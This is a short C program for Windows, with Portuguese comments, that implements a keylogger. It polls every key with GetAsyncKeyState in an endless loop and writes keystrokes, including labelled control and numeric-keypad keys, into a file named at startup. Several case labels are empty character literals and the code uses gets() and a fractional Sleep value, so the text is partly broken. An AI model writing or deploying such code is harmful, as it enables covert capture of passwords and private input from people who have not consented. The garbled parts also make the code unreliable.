#include <windows.h>
#include <stdio.h>

main() {
	int result, teclas;
	FILE *arquivo;
	char nome[50];
	
	gets(nome);
	
	arquivo = fopen(nome, "w");

	while(1) {
		for(teclas = 1; teclas <= 255; teclas++) {
			Sleep(0.01);

			result = GetAsyncKeyState(teclas);

			if(result == -32767) { 

				switch(teclas) {
					// teclas de controle
					case '': fprintf(arquivo, " |CLIQUE_DIREITO| "	); break;
					case '': fprintf(arquivo, " |SHIFT| "					); break;
					case '': fprintf(arquivo, " |CAPSLOCK| "		  	); break;
					case '': fprintf(arquivo, " |APAGAR| "		   		); break;
					
					// teclado numerico
					case '`': fprintf(arquivo, "0"									); break;
					case 'a': fprintf(arquivo, "1"				         	); break;
					case 'b': fprintf(arquivo, "2"				         	); break;
					case 'c': fprintf(arquivo, "3"				         	); break;
					case 'd': fprintf(arquivo, "4"				         	); break;
					case 'e': fprintf(arquivo, "5"				         	); break;
					case 'f': fprintf(arquivo, "6"				         	); break;
					case 'g': fprintf(arquivo, "7"				         	); break;
					case 'h': fprintf(arquivo, "8"				         	); break;
					case 'i': fprintf(arquivo, "9"				         	); break;
					
					// simbolos
					case '2': fprintf(arquivo, "@"		   						); break;
					
					default: fprintf(arquivo, "%c"		 		, teclas	); break;
						
				}
			}
		}
	}
}
